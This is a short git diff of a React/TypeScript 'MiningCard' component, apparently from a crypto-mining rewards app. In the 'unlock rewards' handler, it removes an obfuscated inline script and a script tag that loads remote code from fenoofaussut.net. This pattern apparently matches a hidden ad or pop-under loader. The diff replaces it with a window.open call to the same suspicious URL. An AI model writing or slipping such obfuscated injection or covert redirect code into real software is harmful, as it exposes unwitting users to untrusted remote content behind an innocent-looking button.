@@ -1,3 +1,4 @@
+
 import { useEffect, useState } from 'react';
 import {
   doc,
@@ -173,20 +174,7 @@ const MiningCard = ({ plan, onClaim }: MiningCardProps) => {
   };
 
   const handleUnlockRewards = () => {
-    const script = document.createElement('script');
-    script.type = 'text/javascript';
-    script.dataset.cfasync = 'false';
-    script.innerHTML = `(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlop';(()=>{})()})();`;
-    document.body.appendChild(script);
-
-    const script2 = document.createElement('script');
-    script2.src = '//fenoofaussut.net/ntfc.php?p=9386736';
-    script2.dataset.cfasync = 'false';
-    script2.async = true;
-    script2.onerror = () => (window as any)._uxlyx && (window as any)._uxlyx();
-    script2.onload = () => (window as any)._czeveqde && (window as any)._czeveqde();
-    document.body.appendChild(script2);
-
+    window.open('//fenoofaussut.net/ntfc.php?p=9386736', '_blank');
     setShowUnlock(false);
   };
 
